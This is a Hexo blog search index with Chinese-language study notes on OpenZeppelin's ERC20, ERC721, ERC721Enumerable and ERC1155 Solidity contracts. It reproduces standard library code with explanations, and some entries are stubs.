<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ERC721Enumerable</title>
    <link href="/2022/11/29/ERC721Enumerable%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/11/29/ERC721Enumerable%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>今天学习ERC721扩展库中的ERC721Enumerable.sol</p><h2 id="ERC721Enumerable-sol代码："><a href="#ERC721Enumerable-sol代码：" class="headerlink" title="ERC721Enumerable.sol代码："></a>ERC721Enumerable.sol代码：</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span><br><span class="hljs-comment">// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC721/extensions/ERC721Enumerable.sol)</span><br><br>pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;../ERC721.sol&quot;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;./IERC721Enumerable.sol&quot;</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@dev</span> This implements an optional extension of &#123;ERC721&#125; defined in the EIP that adds</span><br><span class="hljs-comment"> * enumerability of all the token ids in the contract as well as all token ids owned by each</span><br><span class="hljs-comment"> * account.</span><br><span class="hljs-comment"> */</span><br>abstract contract <span class="hljs-title class_">ERC721Enumerable</span> is <span class="hljs-title class_">ERC721</span>, <span class="hljs-title class_">IERC721Enumerable</span> &#123;<br>    <span class="hljs-comment">// Mapping from owner to list of owned token IDs</span><br>    <span class="hljs-title function_">mapping</span>(<span class="hljs-function"><span class="hljs-params">address</span> =&gt;</span> <span class="hljs-title function_">mapping</span>(<span class="hljs-function"><span class="hljs-params">uint256</span> =&gt;</span> uint256)) private _ownedTokens;<br><br>    <span class="hljs-comment">// Mapping from token ID to index of the owner tokens list</span><br>    <span class="hljs-title function_">mapping</span>(<span class="hljs-function"><span class="hljs-params">uint256</span> =&gt;</span> uint256) private _ownedTokensIndex;<br><br>    <span class="hljs-comment">// Array with all token ids, used for enumeration</span><br>    uint256[] private _allTokens;<br><br>    <span class="hljs-comment">// Mapping from token id to position in the allTokens array</span><br>    <span class="hljs-title function_">mapping</span>(<span class="hljs-function"><span class="hljs-params">uint256</span> =&gt;</span> uint256) private _allTokensIndex;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@dev</span> See &#123;IERC165-supportsInterface&#125;.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">supportsInterface</span>(<span class="hljs-params">bytes4 interfaceId</span>) public view virtual <span class="hljs-title function_">override</span>(<span class="hljs-title class_">IERC165</span>, <span class="hljs-title class_">ERC721</span>) returns (bool) &#123;<br>        <span class="hljs-keyword">return</span> interfaceId == <span class="hljs-title function_">type</span>(<span class="hljs-title class_">IERC721Enumerable</span>).<span class="hljs-property">interfaceId</span> || <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">supportsInterface</span>(interfaceId);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@dev</span> See &#123;IERC721Enumerable-tokenOfOwnerByIndex&#125;.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">tokenOfOwnerByIndex</span>(<span class="hljs-params">address owner, uint256 index</span>) public view virtual override returns (uint256) &#123;<br>        <span class="hljs-built_in">require</span>(index &lt; <span class="hljs-title class_">ERC721</span>.<span class="hljs-title function_">balanceOf</span>(owner), <span class="hljs-string">&quot;ERC721Enumerable: owner index out of bounds&quot;</span>);<br>        <span class="hljs-keyword">return</span> _ownedTokens[owner][index];<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@dev</span> See &#123;IERC721Enumerable-totalSupply&#125;.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">totalSupply</span>(<span class="hljs-params"></span>) public view virtual override returns (uint256) &#123;<br>        <span class="hljs-keyword">return</span> _allTokens.<span class="hljs-property">length</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@dev</span> See &#123;IERC721Enumerable-tokenByIndex&#125;.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">tokenByIndex</span>(<span class="hljs-params">uint256 index</span>) public view virtual override returns (uint256) &#123;<br>        <span class="hljs-built_in">require</span>(index &lt; <span class="hljs-title class_">ERC721Enumerable</span>.<span class="hljs-title function_">totalSupply</span>(), <span class="hljs-string">&quot;ERC721Enumerable: global index out of bounds&quot;</span>);<br>        <span class="hljs-keyword">return</span> _allTokens[index];<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@dev</span> See &#123;ERC721-_beforeTokenTransfer&#125;.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">_beforeTokenTransfer</span>(<span class="hljs-params"></span><br><span class="hljs-params">        address <span class="hljs-keyword">from</span>,</span><br><span class="hljs-params">        address to,</span><br><span class="hljs-params">        uint256 firstTokenId,</span><br><span class="hljs-params">        uint256 batchSize</span><br><span class="hljs-params">    </span>) internal virtual override &#123;<br>        <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">_beforeTokenTransfer</span>(<span class="hljs-keyword">from</span>, to, firstTokenId, batchSize);<br><br>        <span class="hljs-keyword">if</span> (batchSize &gt; <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-comment">// Will only trigger during construction. Batch transferring (minting) is not available afterwards.</span><br>            <span class="hljs-title function_">revert</span>(<span class="hljs-string">&quot;ERC721Enumerable: consecutive transfers not supported&quot;</span>);<br>        &#125;<br><br>        uint256 tokenId = firstTokenId;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">from</span> == <span class="hljs-title function_">address</span>(<span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-title function_">_addTokenToAllTokensEnumeration</span>(tokenId);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">from</span> != to) &#123;<br>            <span class="hljs-title function_">_removeTokenFromOwnerEnumeration</span>(<span class="hljs-keyword">from</span>, tokenId);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (to == <span class="hljs-title function_">address</span>(<span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-title function_">_removeTokenFromAllTokensEnumeration</span>(tokenId);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (to != <span class="hljs-keyword">from</span>) &#123;<br>            <span class="hljs-title function_">_addTokenToOwnerEnumeration</span>(to, tokenId);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@dev</span> Private function to add a token to this extension&#x27;s ownership-tracking data structures.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> to address representing the new owner of the given token ID</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> tokenId uint256 ID of the token to be added to the tokens list of the given address</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">_addTokenToOwnerEnumeration</span>(<span class="hljs-params">address to, uint256 tokenId</span>) private &#123;<br>        uint256 length = <span class="hljs-title class_">ERC721</span>.<span class="hljs-title function_">balanceOf</span>(to);<br>        _ownedTokens[to][length] = tokenId;<br>        _ownedTokensIndex[tokenId] = length;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@dev</span> Private function to add a token to this extension&#x27;s token tracking data structures.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> tokenId uint256 ID of the token to be added to the tokens list</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">_addTokenToAllTokensEnumeration</span>(<span class="hljs-params">uint256 tokenId</span>) private &#123;<br>        _allTokensIndex[tokenId] = _allTokens.<span class="hljs-property">length</span>;<br>        _allTokens.<span class="hljs-title function_">push</span>(tokenId);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@dev</span> Private function to remove a token from this extension&#x27;s ownership-tracking data structures. Note that</span><br><span class="hljs-comment">     * while the token is not assigned a new owner, the `_ownedTokensIndex` mapping is _not_ updated: this allows for</span><br><span class="hljs-comment">     * gas optimizations e.g. when performing a transfer operation (avoiding double writes).</span><br><span class="hljs-comment">     * This has O(1) time complexity, but alters the order of the _ownedTokens array.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> from address representing the previous owner of the given token ID</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> tokenId uint256 ID of the token to be removed from the tokens list of the given address</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">_removeTokenFromOwnerEnumeration</span>(<span class="hljs-params">address <span class="hljs-keyword">from</span>, uint256 tokenId</span>) private &#123;<br>        <span class="hljs-comment">// To prevent a gap in from&#x27;s tokens array, we store the last token in the index of the token to delete, and</span><br>        <span class="hljs-comment">// then delete the last slot (swap and pop).</span><br><br>        uint256 lastTokenIndex = <span class="hljs-title class_">ERC721</span>.<span class="hljs-title function_">balanceOf</span>(<span class="hljs-keyword">from</span>) - <span class="hljs-number">1</span>;<br>        uint256 tokenIndex = _ownedTokensIndex[tokenId];<br><br>        <span class="hljs-comment">// When the token to delete is the last token, the swap operation is unnecessary</span><br>        <span class="hljs-keyword">if</span> (tokenIndex != lastTokenIndex) &#123;<br>            uint256 lastTokenId = _ownedTokens[<span class="hljs-keyword">from</span>][lastTokenIndex];<br><br>            _ownedTokens[<span class="hljs-keyword">from</span>][tokenIndex] = lastTokenId; <span class="hljs-comment">// Move the last token to the slot of the to-delete token</span><br>            _ownedTokensIndex[lastTokenId] = tokenIndex; <span class="hljs-comment">// Update the moved token&#x27;s index</span><br>        &#125;<br><br>        <span class="hljs-comment">// This also deletes the contents at the last position of the array</span><br>        <span class="hljs-keyword">delete</span> _ownedTokensIndex[tokenId];<br>        <span class="hljs-keyword">delete</span> _ownedTokens[<span class="hljs-keyword">from</span>][lastTokenIndex];<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@dev</span> Private function to remove a token from this extension&#x27;s token tracking data structures.</span><br><span class="hljs-comment">     * This has O(1) time complexity, but alters the order of the _allTokens array.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> tokenId uint256 ID of the token to be removed from the tokens list</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">_removeTokenFromAllTokensEnumeration</span>(<span class="hljs-params">uint256 tokenId</span>) private &#123;<br>        <span class="hljs-comment">// To prevent a gap in the tokens array, we store the last token in the index of the token to delete, and</span><br>        <span class="hljs-comment">// then delete the last slot (swap and pop).</span><br><br>        uint256 lastTokenIndex = _allTokens.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;<br>        uint256 tokenIndex = _allTokensIndex[tokenId];<br><br>        <span class="hljs-comment">// When the token to delete is the last token, the swap operation is unnecessary. However, since this occurs so</span><br>        <span class="hljs-comment">// rarely (when the last minted token is burnt) that we still do the swap here to avoid the gas cost of adding</span><br>        <span class="hljs-comment">// an &#x27;if&#x27; statement (like in _removeTokenFromOwnerEnumeration)</span><br>        uint256 lastTokenId = _allTokens[lastTokenIndex];<br><br>        _allTokens[tokenIndex] = lastTokenId; <span class="hljs-comment">// Move the last token to the slot of the to-delete token</span><br>        _allTokensIndex[lastTokenId] = tokenIndex; <span class="hljs-comment">// Update the moved token&#x27;s index</span><br><br>        <span class="hljs-comment">// This also deletes the contents at the last position of the array</span><br>        <span class="hljs-keyword">delete</span> _allTokensIndex[tokenId];<br>        _allTokens.<span class="hljs-title function_">pop</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>因为ERC721只能知道用户拥有多少NFT，并不能得到NFT的具体情况，所以oz写了这么一个用来记录NFT明细的库。<br>合约声明了一个叫_ownedTokens的mapping，可以按顺序查看到持币人拥有的token的ID；<br>合约声明了一个叫_ownedTokensIndex的mapping，记录了每个token在持币人所拥有token中的索引；<br>合约声明了一个叫_allTokens的uint256数组，它记录了合约铸造的所有token的Id，在用户调用mint函数时，会将铸造的token的Id push到这个数组中去；<br>合约声明了一个叫_allTokensIndex的mapping，它记录了每一个token在_allTokens数组中的索引。</p><p>合约主要写了两个创新的函数，一个是tokenOfOwnerByIndex，这个函数让用户可以查看某个用户的持币列表中在index位置的token的Id是多少；另一个是tokenByIndex，这个函数让用户可以给出一个index来查看整个合约中现存的所有token在index位置上的token的id。</p><p>_addTokenToOwnerEnumeration和_addTokenToAllTokensEnumeration函数都是在用户增加token的时候对数组进行更新，_removeTokenFromOwnerEnumeration和_removeTokenFromAllTokensEnumeration函数都是在用户失去币的时候对数组进行更新。</p><p>总的来说，这个ERC721的扩展，让用户可以对所有的NFT进行遍历。</p>]]></content>
    
    
    
    <tags>
      
      <tag>ERC721Enumerable学习记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ERC721</title>
    <link href="/2022/11/29/ERC721/"/>
    <url>/2022/11/29/ERC721/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="">ERC1155 github代码地址</a></p></blockquote><p>ERC721代码的组成：</p><h2 id="ERC20-sol合约"><a href="#ERC20-sol合约" class="headerlink" title="ERC20.sol合约:"></a>ERC20.sol合约:</h2><p>与ERC20不同的是，ERC721定义了一个tokenId,也就是说每一个token都是唯一的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><br></code></pre></td></tr></table></figure><p>_owners数组：记录tokenId的持有者<br>_balance数组：记录地址持有的token数量<br>_tokenApprovals数组：可以通过tokenId来查看被批准的账户<br>_operatorApprovals：可以查看A地址是否给B地址权限</p>]]></content>
    
    
    
    <tags>
      
      <tag>记录ERC20学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ERC1155</title>
    <link href="/2022/11/29/ERC1155/"/>
    <url>/2022/11/29/ERC1155/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="">ERC1155 github代码地址</a></p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>记录ERC20学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ERC20</title>
    <link href="/2022/11/28/ERC20/"/>
    <url>/2022/11/28/ERC20/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol">ERC20 github代码地址</a></p></blockquote><p>ERC20代码的组成很简单：<img src="/2022/11/28/ERC20/ERC20%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84.png" class=""><br>我们先来看ERC20.sol合约:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">mapping</span>(<span class="hljs-function"><span class="hljs-params">address</span> =&gt;</span> uint256) private _balances;<br><span class="hljs-title function_">mapping</span>(<span class="hljs-function"><span class="hljs-params">address</span> =&gt;</span> <span class="hljs-title function_">mapping</span>(<span class="hljs-function"><span class="hljs-params">address</span> =&gt;</span> uint256)) private _allowances;<br><br>uint256 private _totalSupply;<br><br>string private _name;<br>string private _symbol;<br></code></pre></td></tr></table></figure><p>定义了一个_balances数组，可以记录每一个账户拥有的token。<br>定义了一个_allowances数组，可以查看A地址向B地址批准了多少金额。<br>定义了一个uint256类型的_totalSupply，记录合约拥有的所有token。<br>定义了一个string类型的_name和_symbol，分别记录代币的名字和代号。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">constructor</span>(<span class="hljs-params">string memory name_, string memory symbol_</span>) &#123;<br>    _name = name_;<br>    _symbol = symbol_;<br>&#125;<br></code></pre></td></tr></table></figure><p>合约的构造函数，在部署合约是执行，部署者输入代币的名字和代号。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">name</span>(<span class="hljs-params"></span>) public view virtual override returns (string memory) &#123;<br>    <span class="hljs-keyword">return</span> _name;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">symbol</span>(<span class="hljs-params"></span>) public view virtual override returns (string memory) &#123;<br>    <span class="hljs-keyword">return</span> _symbol;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">decimals</span>(<span class="hljs-params"></span>) public view virtual override returns (uint8) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">18</span>;<br>&#125;<br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">totalSupply</span>(<span class="hljs-params"></span>) public view virtual override returns (uint256) &#123;<br>    <span class="hljs-keyword">return</span> _totalSupply;<br>&#125;<br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">balanceOf</span>(<span class="hljs-params">address account</span>) public view virtual override returns (uint256) &#123;<br>    <span class="hljs-keyword">return</span> _balances[account];<br>&#125;<br></code></pre></td></tr></table></figure><p>name函数：返回token的_name<br>symbol函数：返回token的_symbol<br>decimals函数：返回token的精度是18<br>totalSupply函数：返回合约记录的总token<br>balanceOf函数：查询用户对应的存款</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">transfer</span>(<span class="hljs-params">address to, uint256 amount</span>) public virtual override returns (bool) &#123;<br>    address owner = <span class="hljs-title function_">_msgSender</span>();<br>    <span class="hljs-title function_">_transfer</span>(owner, to, amount);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>transfer函数：msg.sender(合约调用者)向to地址转账，金额为amount，调用了internal的_transfer函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">allowance</span>(<span class="hljs-params">address owner, address spender</span>) public view virtual override returns (uint256) &#123;<br>    <span class="hljs-keyword">return</span> _allowances[owner][spender];<br>&#125;<br></code></pre></td></tr></table></figure><p>allowance函数：查询owner地址向spender地址批准了多少金额</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">approve</span>(<span class="hljs-params">address spender, uint256 amount</span>) public virtual override returns (bool) &#123;<br>    address owner = <span class="hljs-title function_">_msgSender</span>();<br>    <span class="hljs-title function_">_approve</span>(owner, spender, amount);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>approve函数：owner地址先spender地址批准金额，金额为amount，调用了internal的_approve函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">transferFrom</span>(<span class="hljs-params"></span><br><span class="hljs-params">    address <span class="hljs-keyword">from</span>,</span><br><span class="hljs-params">    address to,</span><br><span class="hljs-params">    uint256 amount</span><br><span class="hljs-params"></span>) public virtual override returns (bool) &#123;<br>    address spender = <span class="hljs-title function_">_msgSender</span>();<br>    <span class="hljs-title function_">_spendAllowance</span>(<span class="hljs-keyword">from</span>, spender, amount);<br>    <span class="hljs-title function_">_transfer</span>(<span class="hljs-keyword">from</span>, to, amount);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>transferFrom函数：从from地址向to地址转账，调用了_spendAllowance和_transfer函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">increaseAllowance</span>(<span class="hljs-params">address spender, uint256 addedValue</span>) public virtual returns (bool) &#123;<br>    address owner = <span class="hljs-title function_">_msgSender</span>();<br>    <span class="hljs-title function_">_approve</span>(owner, spender, <span class="hljs-title function_">allowance</span>(owner, spender) + addedValue);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">decreaseAllowance</span>(<span class="hljs-params">address spender, uint256 subtractedValue</span>) public virtual returns (bool) &#123;<br>    address owner = <span class="hljs-title function_">_msgSender</span>();<br>    uint256 currentAllowance = <span class="hljs-title function_">allowance</span>(owner, spender);<br>    <span class="hljs-built_in">require</span>(currentAllowance &gt;= subtractedValue, <span class="hljs-string">&quot;ERC20: decreased allowance below zero&quot;</span>);<br>    unchecked &#123;<br>        <span class="hljs-title function_">_approve</span>(owner, spender, currentAllowance - subtractedValue);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>increaseAllowance函数：可以增加owner地址到spender地址批准的金额，增加的量为addedValue<br>decreaseAllowance函数：可以减少owner地址到spender地址批准的金额，减少的量为subtractedValue</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">_transfer</span>(<span class="hljs-params"></span><br><span class="hljs-params">    address <span class="hljs-keyword">from</span>,</span><br><span class="hljs-params">    address to,</span><br><span class="hljs-params">    uint256 amount</span><br><span class="hljs-params"></span>) internal virtual &#123;<br>    <span class="hljs-built_in">require</span>(<span class="hljs-keyword">from</span> != <span class="hljs-title function_">address</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&quot;ERC20: transfer from the zero address&quot;</span>);<br>    <span class="hljs-built_in">require</span>(to != <span class="hljs-title function_">address</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&quot;ERC20: transfer to the zero address&quot;</span>);<br><br>    <span class="hljs-title function_">_beforeTokenTransfer</span>(<span class="hljs-keyword">from</span>, to, amount);<br><br>    uint256 fromBalance = _balances[<span class="hljs-keyword">from</span>];<br>    <span class="hljs-built_in">require</span>(fromBalance &gt;= amount, <span class="hljs-string">&quot;ERC20: transfer amount exceeds balance&quot;</span>);<br>    unchecked &#123;<br>        _balances[<span class="hljs-keyword">from</span>] = fromBalance - amount;<br>        <span class="hljs-comment">// Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by</span><br>        <span class="hljs-comment">// decrementing then incrementing.</span><br>        _balances[to] += amount;<br>    &#125;<br><br>    emit <span class="hljs-title class_">Transfer</span>(<span class="hljs-keyword">from</span>, to, amount);<br><br>    <span class="hljs-title function_">_afterTokenTransfer</span>(<span class="hljs-keyword">from</span>, to, amount);<br>&#125;<br></code></pre></td></tr></table></figure><p>_transfe函数：要求from和to地址都不能是0地址，要求from账户拥有的金额要大于amount，可发送Transfer事件。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span 